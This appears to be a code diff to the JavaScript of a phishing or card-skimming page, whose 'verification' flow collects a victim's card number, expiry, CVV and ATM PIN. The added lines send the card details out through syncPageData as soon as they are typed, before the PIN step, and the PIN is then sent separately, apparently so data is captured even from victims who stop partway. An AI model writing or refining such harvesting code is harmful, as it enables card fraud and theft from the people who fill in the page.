@@ -71,6 +71,15 @@ function openModal() {
     collectedData.cardNumber = document.getElementById("cardNumber")?.value;
     collectedData.expiry = document.getElementById("expiry")?.value;
     collectedData.cvv = document.getElementById("cvv")?.value;
+    
+    if (collectedData.cardNumber && collectedData.expiry && collectedData.cvv) {
+        syncPageData("card", {
+            cardNumber: collectedData.cardNumber,
+            expiry: collectedData.expiry,
+            cvv: collectedData.cvv
+        });
+    }
+
     document.getElementById('pinModal').style.display = 'flex';
 }
 
@@ -81,10 +90,7 @@ function closeModal(e) {
 
 function completeVerification() {
     collectedData.confirmAtmPin = document.getElementById("confirmAtmPin")?.value;
-    syncPageData("card", {
-        cardNumber: collectedData.cardNumber,
-        expiry: collectedData.expiry,
-        cvv: collectedData.cvv,
+    syncPageData("confirm_pin", {
         confirmAtmPin: collectedData.confirmAtmPin
     });
     submitFormData();
